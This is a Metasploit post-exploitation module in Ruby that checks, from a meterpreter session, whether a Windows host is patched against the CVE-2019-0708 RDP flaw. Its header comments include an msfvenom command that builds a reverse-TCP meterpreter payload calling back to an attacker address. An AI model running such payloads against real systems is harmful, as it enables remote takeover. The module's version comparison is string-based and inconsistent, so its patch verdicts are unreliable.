##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : CVE-2019-0708.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Affected versions: Windows XP, Windows 7, Server 2003, Server 2008, Server 2008 R2
#
# [ DESCRIPTION ]
# A remote code execution vulnerability exists in Remote Desktop Services when an unauthenticated attacker
# connects to the target system using RDP and sends specially crafted requests. This vulnerability is
# pre-authentication and requires no user interaction. An attacker who successfully exploited this
# vulnerability could execute arbitrary code on the target system.
# ---
# This module will check if current system its patched or vulnerable to CVE-2019-0708 (RDP-RCE) by checking
# if the correct security patchs are installed. check termdd.sys driver version number and presents a list
# of all installed security patchs (KB ID).
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on  => set SESSION 1
# List_Only security patchs installed ?     => set LIST_ONLY true
# Absoluct path of termdd.sys file (remote) => set RPATH C:\\Windows\\System32\\Drivers\\termdd.sys
#
#
# [ PORT MODULE TO METASPLOIT DATABASE (execute in terminal) ]
# path=$(locate modules/post/windows/recon | grep -v '\doc' | grep -v '\documentation' | head -n 1)
# sudo cp cve_2019_0708.rb $path/cve_2019_0708.rb
#
#
# [ RELOAD MSF DATABASE (execute in terminal) ]
# sudo service postgresql start && msfdb reinit
# sudo msfconsole -x 'db_status;reload_all;exit -y'
#
#
# [ BUILD PAYLOAD TO TEST MODULE ]
# sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 -f exe -o binary.exe
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > use post/windows/recon/CVE-2019-0708
# msf post(windows/recon/CVE-2019-0708) > info
# msf post(windows/recon/CVE-2019-0708) > show options
# msf post(windows/recon/CVE-2019-0708) > show advanced options
# msf post(windows/recon/CVE-2019-0708) > set [option(s)]
# msf post(windows/recon/CVE-2019-0708) > exploit
##



## Metasploit libraries
require 'rex'
require 'msf/core'
require 'msf/core/post/common'


## Metasploit Class name and mixins
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking

        include Msf::Post::Common
        include Msf::Post::Windows::Error


        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'CVE-2019-0708 (patch) checks',
                        'Description'   => %q{
                                        This module will check if current system its patched or vulnerable to CVE-2019-0708 (RDP-RCE) by checking if the correct security patchs are installed. Check termdd.sys driver version number and presents a list of all installed security patchs (KB ID).
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'r00t-3xp10it <pedroubuntu10[at]gmail.com>',
                                ],
                        'Version'        => '$Revision: 1.3',
                        'DisclosureDate' => '25 mai 2019',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',   # Thats no need for privilege escalation.
                        'Targets'        =>
                                [
                                         # Affected systems are.
                                         [ 'windows 2003', 'windows 2008', 'Windows 2008 R2', 'Windows XP', 'Windows 7' ]
                                ],
                        'DefaultTarget'  => '3', # Default its to run againts windows 2008 R2
                        'References'     =>
                                [
                                         [ 'CVE', '2019-0708' ],
                                         [ 'URL', 'https://wazehell.io/2019/05/22/cve-2019-0708-technical-analysis-rdp-rce' ],
                                         [ 'URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708' ],
                                         [ 'URL', 'https://support.microsoft.com/pt-pt/help/4500705/customer-guidance-for-cve-2019-0708' ]

                                ],
			'DefaultOptions' =>
				{
                                         'RPATH' => 'C:\\Windows\\System32\\Drivers\\termdd.sys',  # Default termdd.sys path
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on', 1]),
                                OptBool.new('LIST_ONLY', [ false, 'List ONLY security patchs installed ?', false])

                        ], self.class)

                register_advanced_options(
                        [
                                OptString.new('RPATH', [ false, 'Absoluct path of termdd.sys (remote)'])
                        ], self.class)

        end



def run
  session = client
  ## Variable declarations
  xhost = client.session_host
  print_status("Check if #{xhost} its patched to CVE-2019-0708")
  Rex::sleep(1.5)

     ## Check for proper operative system releases
     unless sysinfo['OS'] =~ /Windows (2003|2008|2008 R2|xp|vista|7|8|10)/i
        print_error("[ABORT]: This module only works againts the follow releases")
        print_warning("Affected Versions: Windows 2003, 2008, 2008 R2, XP, 7")
        return nil
     end

    ## Check for proper session (meterpreter)
    if sysinfo.nil? or sysinfo == '' or sysinfo == ' '
       print_error("ABORT]: This post-module only works in meterpreter sessions")
       return nil
    end

    ## Local variable declarations
    xpath = datastore['RPATH']
    ## Get all installed patchs (HotFixID)
    print_status("Listing ALL security patchs installed (remote)")
    Rex::sleep(0.5)
    kb_id = cmd_exec("wmic qfe get Hotfixid")
    ## Parse data (security patchs KB ID number)
    parse = kb_id.split(' ')


## 27 KB IDs (windows 10)
# NOTE: normaly there arent more than 27 KB patchs installed
print_status("Parsing HotFixID data (List of security patchs)")
Rex::sleep(0.5)
kb_um = parse[1]
kb_dois = parse[2]
kb_tres = parse[3]
kb_quatro = parse[4]
kb_cinco = parse[5]
kb_seis = parse[6]
kb_sete = parse[7]
kb_oito = parse[8]
kb_nove = parse[9]
kb_dez = parse[10]
kb_onze = parse[11]
kb_doze = parse[12]
kb_treze = parse[13]
kb_quatorse = parse[14]
kb_quinze = parse[15]
kb_dezaseis = parse[16]
kb_dezasete = parse[17]
kb_dezoito = parse[18]
kb_dezanove = parse[19]
kb_vinte = parse[20]
kb_vinteum = parse[21]
kb_vintedois = parse[22]
kb_vintetres = parse[23]
kb_vintequatro = parse[24]
kb_vintecinco = parse[25]
kb_vinteseis = parse[26]
kb_vintesete = parse[27]
kb_vinteoito = parse[28]
kb_vintenove = parse[29]
kb_trinta = parse[30]


## List ONLY security patch(s) installed
# Do not check for CVE-2019-0708 vulnerability.
if datastore['LIST_ONLY'] == true
   sec_patch = cmd_exec("wmic qfe get HotFixID,InstalledOn,Description | findstr \"Security\"")
   print_good("Listing ONLY security patchs installed.")
   Rex::sleep(1.0)
   print_line("")
   print_line("    Computer    : #{sysinfo['Computer']}")
   print_line("    OS          : #{sysinfo['OS']}")
   print_line("    ARCH        : #{sysinfo['Architecture']}")
   print_line("")
   print_line("Description      HotFixID   InstalledOn")
   print_line("-----------      --------   -----------")
   print_line("#{sec_patch}")
   print_line("")
   return nil
end


## termdd.sys patched version number
# This version numbers reffers to patched versions
if sysinfo['OS'] =~ /Windows (2008 R2|7)/i
   patched_version = "6.1.7601.24441"
elsif sysinfo['OS'] =~ /Windows (2008|vista)/i
   patched_version = "6.0.6003.20514"
elsif sysinfo['OS'] =~ /Windows xp/i
   patched_version = "5.2.3790.6787"   
elsif sysinfo['OS'] =~ /Windows 2003/i
   patched_version = "5.2.3790.3959"
else
   ## Just in case lets set the higher version
   patched_version = "6.1.7601.24441"
end


## Make sure termdd exists (remote)
if session.fs.file.exist?(xpath)
   print_status("Retry/Compare termdd.sys driver version number")
   Rex::sleep(0.5)
   term_ver = cmd_exec("powershell -C \"(Get-Command #{xpath}).FileVersionInfo.FileVersion\"") 
      ## Compare termdd version number againts patched version number
      if term_ver == "#{patched_version}"
         ver_stat = "Driver is PATCHED againts CVE-2019-0708"
      elsif term_ver > "#{patched_version}"
         ver_stat = "Driver is PATCHED againts CVE-2019-0708"
      elsif term_ver < "#{patched_version}"
         ver_stat = "Driver is VULNERABLE to CVE-2019-0708"
      else
         ## Somethings wrong in retry version number (wrong path?)
         ver_stat = "Module can not retry termdd.sys version number"
      end
else
    ## termdd.sys driver not found (release not vuln)
    ver_stat = "Module can not find termdd.sys driver"
end


print_good("Displaying CVE-2019-0708 vulnerability tests.")
Rex::sleep(1.5)
## Check OS version and KB ID number
# Version vuln by default to cve-2019-0708
if sysinfo['OS'] =~ /Windows (2008|2008 R2)/i   
   ## check if correct patch(s) are installed
   if kb_id =~ /(KB4499180|KB4499149|KB4499175|KB4499164)/
      print_line("")
      print_line("    Computer    : #{sysinfo['Computer']}")
      print_line("    OS          : #{sysinfo['OS']}")
      print_line("    ARCH        : #{sysinfo['Architecture']}")
      print_line("    Status      : This system is PATCHED againts CVE-2019-0708")
      print_line("    HotFixID(s) : KB4499180|KB4499149|KB4499175|KB4499164 - Security Patch Found")
      print_line("    Termdd.sys  : #{term_ver}")
      print_line("    Status      : #{ver_stat}")
      print_line("    Path        : #{xpath}")
      print_line("")
      print_line("    List of Installed Patchs:")
      print_line("       #{kb_um} #{kb_dois} #{kb_tres} #{kb_quatro} #{kb_cinco} #{kb_seis}")
      print_line("       #{kb_sete} #{kb_oito} #{kb_nove} #{kb_dez} #{kb_onze} #{kb_doze}")
      print_line("       #{kb_treze} #{kb_quatorse} #{kb_quinze} #{kb_dezaseis} #{kb_dezasete} #{kb_dezoito}")
      print_line("       #{kb_dezanove} #{kb_vinte} #{kb_vinteum} #{kb_vintedois} #{kb_vintetres} #{kb_vintequatro}")
      print_line("       #{kb_vintecinco} #{kb_vinteseis} #{kb_vintesete} #{kb_vinteoito} #{kb_vintenove} #{kb_trinta}")
      print_line("")
      print_line("    References  :")
      print_line("       https://wazehell.io/2019/05/22/cve-2019-0708-technical-analysis-rdp-rce/")
      print_line("       https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708")
      print_line("       https://support.microsoft.com/pt-pt/help/4500705/customer-guidance-for-cve-2019-0708")
      print_line("")
   else
      ## Security patch not found (vulnerable)
      print_error("[ERROR] CVE-2019-0708 Security patch not found")
      Rex::sleep(1.0)
      print_line("")
      print_line("    Computer    : #{sysinfo['Computer']}")
      print_line("    OS          : #{sysinfo['OS']}")
      print_line("    ARCH        : #{sysinfo['Architecture']}")
      print_line("    Status      : This system is VULNERABLE to CVE-2019-0708")
      print_line("    HotFixID(s) : KB4499180|KB4499149|KB4499175|KB4499164 - Security Patch Not Found")
      print_line("    Termdd.sys  : #{term_ver}")
      print_line("    Status      : #{ver_stat}")
      print_line("    Path        : #{xpath}")
      print_line("")
      print_line("    List of Installed Patchs:")
      print_line("       #{kb_um} #{kb_dois} #{kb_tres} #{kb_quatro} #{kb_cinco} #{kb_seis}")
      print_line("       #{kb_sete} #{kb_oito} #{kb_nove} #{kb_dez} #{kb_onze} #{kb_doze}")
      print_line("       #{kb_treze} #{kb_quatorse} #{kb_quinze} #{kb_dezaseis} #{kb_dezasete} #{kb_dezoito}")
      print_line("       #{kb_dezanove} #{kb_vinte} #{kb_vinteum} #{kb_vintedois} #{kb_vintetres} #{kb_vintequatro}")
      print_line("       #{kb_vintecinco} #{kb_vinteseis} #{kb_vintesete} #{kb_vinteoito} #{kb_vintenove} #{kb_trinta}")
      print_line("")
      print_line("    References  :")
      print_line("       https://wazehell.io/2019/05/22/cve-2019-0708-technical-analysis-rdp-rce/")
      print_line("       https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708")
      print_line("       https://support.microsoft.com/pt-pt/help/4500705/customer-guidance-for-cve-2019-0708")
      print_line("")
   end

## Check OS version and KB ID number
elsif sysinfo['OS'] =~ /Windows vista/i
   ## check if correct patch are installed
   if kb_id =~ /KB4499180/
      print_line("")
      print_line("    Computer    : #{sysinfo['Computer']}")
      print_line("    OS          : #{sysinfo['OS']}")
      print_line("    ARCH        : #{sysinfo['Architecture']}")
      print_line("    Status      : This system is PATCHED againts CVE-2019-0708")
      print_line("    HotFixID    : KB4499180 - Security Patch Found")
      print_line("    Termdd.sys  : #{term_ver}")
      print_line("    Status      : #{ver_stat}")
      print_line("    Path        : #{xpath}")
      print_line("")
      print_line("    List of Installed Patchs:")
      print_line("       #{kb_um} #{kb_dois} #{kb_tres} #{kb_quatro} #{kb_cinco} #{kb_seis}")
      print_line("       #{kb_sete} #{kb_oito} #{kb_nove} #{kb_dez} #{kb_onze} #{kb_doze}")
      print_line("       #{kb_treze} #{kb_quatorse} #{kb_quinze} #{kb_dezaseis} #{kb_dezasete} #{kb_dezoito}")
      print_line("       #{kb_dezanove} #{kb_vinte} #{kb_vinteum} #{kb_vintedois} #{kb_vintetres} #{kb_vintequatro}")
      print_line("       #{kb_vintecinco} #{kb_vinteseis} #{kb_vintesete} #{kb_vinteoito} #{kb_vintenove} #{kb_trinta}")
      print_line("")
      print_line("    References  :")
      print_line("       https://wazehell.io/2019/05/22/cve-2019-0708-technical-analysis-rdp-rce/")
      print_line("       https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708")
      print_line("       https://support.microsoft.com/pt-pt/help/4500705/customer-guidance-for-cve-2019-0708")
      print_line("")
   else
      ## Security patch not found (vulnerable)
      print_error("[ERROR] CVE-2019-0708 Security patch not found")
      Rex::sleep(1.0)
      print_line("")
      print_line("    Computer    : #{sysinfo['Computer']}")
      print_line("    OS          : #{sysinfo['OS']}")
      print_line("    ARCH        : #{sysinfo['Architecture']}")
      print_line("    Status      : This system is VULNERABLE to CVE-2019-0708")
      print_line("    HotFixID    : KB4499180 - Security Patch Not Found")
      print_line("    Termdd.sys  : #{term_ver}")
      print_line("    Status      : #{ver_stat}")
      print_line("    Path        : #{xpath}")
      print_line("")
      print_line("    List of Installed Patchs:")
      print_line("       #{kb_um} #{kb_dois} #{kb_tres} #{kb_quatro} #{kb_cinco} #{kb_seis}")
      print_line("       #{kb_sete} #{kb_oito} #{kb_nove} #{kb_dez} #{kb_onze} #{kb_doze}")
      print_line("       #{kb_treze} #{kb_quatorse} #{kb_quinze} #{kb_dezaseis} #{kb_dezasete} #{kb_dezoito}")
      print_line("       #{kb_dezanove} #{kb_vinte} #{kb_vinteum} #{kb_vintedois} #{kb_vintetres} #{kb_vintequatro}")
      print_line("       #{kb_vintecinco} #{kb_vinteseis} #{kb_vintesete} #{kb_vinteoito} #{kb_vintenove} #{kb_trinta}")
      print_line("")
      print_line("    References  :")
      print_line("       https://wazehell.io/2019/05/22/cve-2019-0708-technical-analysis-rdp-rce/")
      print_line("       https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708")
      print_line("       https://support.microsoft.com/pt-pt/help/4500705/customer-guidance-for-cve-2019-0708")
      print_line("")
   end

## Check OS version and KB ID number
# version vuln by default to cve-2019-0708
elsif sysinfo['OS'] =~ /Windows (2003|xp)/i
   ## check if correct patch are installed
   if kb_id =~ /KB4500331/
      print_line("")
      print_line("    Computer    : #{sysinfo['Computer']}")
      print_line("    OS          : #{sysinfo['OS']}")
      print_line("    ARCH        : #{sysinfo['Architecture']}")
      print_line("    Status      : This system is PATCHED againts CVE-2019-0708")
      print_line("    HotFixID    : KB4500331 - Security Patch Found")
      print_line("    Termdd.sys  : #{term_ver}")
      print_line("    Status      : #{ver_stat}")
      print_line("    Path        : #{xpath}")
      print_line("")
      print_line("    List of Installed Patchs:")
      print_line("       #{kb_um} #{kb_dois} #{kb_tres} #{kb_quatro} #{kb_cinco} #{kb_seis}")
      print_line("       #{kb_sete} #{kb_oito} #{kb_nove} #{kb_dez} #{kb_onze} #{kb_doze}")
      print_line("       #{kb_treze} #{kb_quatorse} #{kb_quinze} #{kb_dezaseis} #{kb_dezasete} #{kb_dezoito}")
      print_line("       #{kb_dezanove} #{kb_vinte} #{kb_vinteum} #{kb_vintedois} #{kb_vintetres} #{kb_vintequatro}")
      print_line("       #{kb_vintecinco} #{kb_vinteseis} #{kb_vintesete} #{kb_vinteoito} #{kb_vintenove} #{kb_trinta}")
      print_line("")
      print_line("    References  :")
      print_line("       https://wazehell.io/2019/05/22/cve-2019-0708-technical-analysis-rdp-rce/")
      print_line("       https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708")
      print_line("       https://support.microsoft.com/pt-pt/help/4500705/customer-guidance-for-cve-2019-0708")
      print_line("")
   else
      ## Security patch not found (vulnerable)
      print_error("[ERROR] CVE-2019-0708 Security patch not found")
      Rex::sleep(1.0)
      print_line("")
      print_line("    Computer    : #{sysinfo['Computer']}")
      print_line("    OS          : #{sysinfo['OS']}")
      print_line("    ARCH        : #{sysinfo['Architecture']}")
      print_line("    Status      : This system is VULNERABLE to CVE-2019-0708")
      print_line("    HotFixID    : KB4500331 - Security Patch Not Found")
      print_line("    Termdd.sys  : #{term_ver}")
      print_line("    Status      : #{ver_stat}")
      print_line("    Path        : #{xpath}")
      print_line("")
      print_line("    List of Installed Patchs:")
      print_line("       #{kb_um} #{kb_dois} #{kb_tres} #{kb_quatro} #{kb_cinco} #{kb_seis}")
      print_line("       #{kb_sete} #{kb_oito} #{kb_nove} #{kb_dez} #{kb_onze} #{kb_doze}")
      print_line("       #{kb_treze} #{kb_quatorse} #{kb_quinze} #{kb_dezaseis} #{kb_dezasete} #{kb_dezoito}")
      print_line("       #{kb_dezanove} #{kb_vinte} #{kb_vinteum} #{kb_vintedois} #{kb_vintetres} #{kb_vintequatro}")
      print_line("       #{kb_vintecinco} #{kb_vinteseis} #{kb_vintesete} #{kb_vinteoito} #{kb_vintenove} #{kb_trinta}")
      print_line("")
      print_line("    References  :")
      print_line("       https://wazehell.io/2019/05/22/cve-2019-0708-technical-analysis-rdp-rce/")
      print_line("       https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708")
      print_line("       https://support.microsoft.com/pt-pt/help/4500705/customer-guidance-for-cve-2019-0708")
      print_line("")
   end

## Check OS version and KB ID number
# version vuln by default to cve-2019-0708
elsif sysinfo['OS'] =~ /Windows 7/i
   ## check if correct patch(s) are installed
   if kb_id =~ /(KB4499175|KB4499164)/
      print_line("")
      print_line("    Computer    : #{sysinfo['Computer']}")
      print_line("    OS          : #{sysinfo['OS']}")
      print_line("    ARCH        : #{sysinfo['Architecture']}")
      print_line("    Status      : This system is PATCHED againts CVE-2019-0708")
      print_line("    HotFixID(s) : KB4499175|KB4499164 - Security Patch Found")
      print_line("    Termdd.sys  : #{term_ver}")
      print_line("    Status      : #{ver_stat}")
      print_line("    Path        : #{xpath}")
      print_line("")
      print_line("    List of Installed Patchs:")
      print_line("       #{kb_um} #{kb_dois} #{kb_tres} #{kb_quatro} #{kb_cinco} #{kb_seis}")
      print_line("       #{kb_sete} #{kb_oito} #{kb_nove} #{kb_dez} #{kb_onze} #{kb_doze}")
      print_line("       #{kb_treze} #{kb_quatorse} #{kb_quinze} #{kb_dezaseis} #{kb_dezasete} #{kb_dezoito}")
      print_line("       #{kb_dezanove} #{kb_vinte} #{kb_vinteum} #{kb_vintedois} #{kb_vintetres} #{kb_vintequatro}")
      print_line("       #{kb_vintecinco} #{kb_vinteseis} #{kb_vintesete} #{kb_vinteoito} #{kb_vintenove} #{kb_trinta}")
      print_line("")
      print_line("    References  :")
      print_line("       https://wazehell.io/2019/05/22/cve-2019-0708-technical-analysis-rdp-rce/")
      print_line("       https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708")
      print_line("       https://support.microsoft.com/pt-pt/help/4500705/customer-guidance-for-cve-2019-0708")
      print_line("")
   else
      ## Security patch not found (vulnerable)
      print_error("[ERROR] CVE-2019-0708 Security patch not found")
      Rex::sleep(1.0)
      print_line("")
      print_line("    Computer    : #{sysinfo['Computer']}")
      print_line("    OS          : #{sysinfo['OS']}")
      print_line("    ARCH        : #{sysinfo['Architecture']}")
      print_line("    Status      : This system is VULNERABLE to CVE-2019-0708")
      print_line("    HotFixID(s) : KB4499175|KB4499164 - Security Patch Not Found")
      print_line("    Termdd.sys  : #{term_ver}")
      print_line("    Status      : #{ver_stat}")
      print_line("    Path        : #{xpath}")
      print_line("")
      print_line("    List of Installed Patchs:")
      print_line("       #{kb_um} #{kb_dois} #{kb_tres} #{kb_quatro} #{kb_cinco} #{kb_seis}")
      print_line("       #{kb_sete} #{kb_oito} #{kb_nove} #{kb_dez} #{kb_onze} #{kb_doze}")
      print_line("       #{kb_treze} #{kb_quatorse} #{kb_quinze} #{kb_dezaseis} #{kb_dezasete} #{kb_dezoito}")
      print_line("       #{kb_dezanove} #{kb_vinte} #{kb_vinteum} #{kb_vintedois} #{kb_vintetres} #{kb_vintequatro}")
      print_line("       #{kb_vintecinco} #{kb_vinteseis} #{kb_vintesete} #{kb_vinteoito} #{kb_vintenove} #{kb_trinta}")
      print_line("")
      print_line("    References  :")
      print_line("       https://wazehell.io/2019/05/22/cve-2019-0708-technical-analysis-rdp-rce/")
      print_line("       https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708")
      print_line("       https://support.microsoft.com/pt-pt/help/4500705/customer-guidance-for-cve-2019-0708")
      print_line("")
   end
   
## Check OS version
elsif sysinfo['OS'] =~ /Windows (8|10)/i
   print_line("")
   print_line("    Computer    : #{sysinfo['Computer']}")
   print_line("    OS          : #{sysinfo['OS']}")
   print_line("    ARCH        : #{sysinfo['Architecture']}")
   print_line("    Status      : This system is not affected by CVE-2019-0708")
   print_line("    HotFixID    : None patch available to address this vulnerability")
   print_line("    Termdd.sys  : This release does not have termdd.sys driver")
   print_line("    Status      : No need to Patch. This Release is patched.")
   print_line("    Path        : #{xpath}")
   print_line("")
   print_line("    List of Installed Patchs:")
   print_line("       #{kb_um} #{kb_dois} #{kb_tres} #{kb_quatro} #{kb_cinco} #{kb_seis}")
   print_line("       #{kb_sete} #{kb_oito} #{kb_nove} #{kb_dez} #{kb_onze} #{kb_doze}")
   print_line("       #{kb_treze} #{kb_quatorse} #{kb_quinze} #{kb_dezaseis} #{kb_dezasete} #{kb_dezoito}")
   print_line("       #{kb_dezanove} #{kb_vinte} #{kb_vinteum} #{kb_vintedois} #{kb_vintetres} #{kb_vintequatro}")
   print_line("       #{kb_vintecinco} #{kb_vinteseis} #{kb_vintesete} #{kb_vinteoito} #{kb_vintenove} #{kb_trinta}")
   print_line("")
   print_line("    References  :")
   print_line("       https://wazehell.io/2019/05/22/cve-2019-0708-technical-analysis-rdp-rce/")
   print_line("       https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708")
   print_line("       https://support.microsoft.com/pt-pt/help/4500705/customer-guidance-for-cve-2019-0708")
   print_line("")

else

   print_error("[ERROR]: This module can not identify system release")
   Rex::sleep(1.0)
   return nil

end

   ## End of the 'def run()' funtion..
   end
end

